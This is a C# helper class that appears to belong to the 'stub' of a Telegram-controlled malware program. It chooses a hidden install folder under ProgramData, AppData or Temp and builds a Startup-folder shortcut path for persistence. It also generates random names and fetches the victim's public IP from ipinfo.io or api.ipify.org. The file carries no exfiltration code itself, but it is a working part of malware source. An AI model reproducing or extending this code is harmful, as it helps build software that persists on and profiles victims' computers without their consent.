using Stub.TelegramAPI;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Stub.Help
{
    class StringHelper
    {
        public static string DesktopPath => Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public static string DocDir => Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static string UserProfile => Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string AssemblyPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        public static readonly string ProDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

        public static string userIP = "";
        public static DirectoryInfo WorkPatch { get; } = new DirectoryInfo(Path.Combine(GetSysDir(), Config.dir));
        public static FileInfo WorkFile { get; } = new FileInfo(Path.Combine(WorkPatch.FullName, Config.bin));
        public static string CurrentProcess { get; } = Process.GetCurrentProcess().MainModule.FileName;
        public static Random Rnd { get; } = new Random();
        public static int Value { get; } = Rnd.Next(2, 7);
        public static string FullPathLnk { get; } = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{Config.bin}.lnk");

        private static string STRING = "abcdefghijklmnopqrstuvwxyz";
        private static string INTEGER = "0123456789";

        private static Random charsRandom = new Random();
        private static Random lengthRandom = new Random();
        public static string Random(int length = 0)
        {
            if (length == 0) length = 30;
            lengthRandom.Next(1, length);
            string chars = STRING.ToUpper() + STRING + INTEGER;
            return new string(Enumerable.Repeat(chars, length).Select(s => s[charsRandom.Next(s.Length)]).ToArray());
        }

        public static string GetSysDir()
        {
            try
            {
                var directories = new Dictionary<string, string>
                {
                  { "0", ProDataPath },
                  { "1", LocalAppData },
                  { "2", AppData },
                  { "3", Path.GetTempPath() }
                };

                if (directories.TryGetValue(Config.sysDir, out var selectedDirectory))
                {
                    return selectedDirectory;
                }
                return ProDataPath;
            }
            catch
            {
                return Path.GetTempPath();
            }
        }

        public static string ReverseString(string str)
        {
            char[] charArray = str.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        public async static void GetIP()
        {
            try
            {
                SSL.GetSSL();
                using (HttpClient client = new HttpClient())
                {
                    userIP = await client.GetStringAsync("https://ipinfo.io/ip");
                }
            }
            catch
            {
                try
                {
                    SSL.GetSSL();
                    using (HttpClient client = new HttpClient())
                    {
                        userIP = await client.GetStringAsync("https://api.ipify.org/");
                    }
                }
                catch { userIP = "NA"; }
            }
        }
    }
}
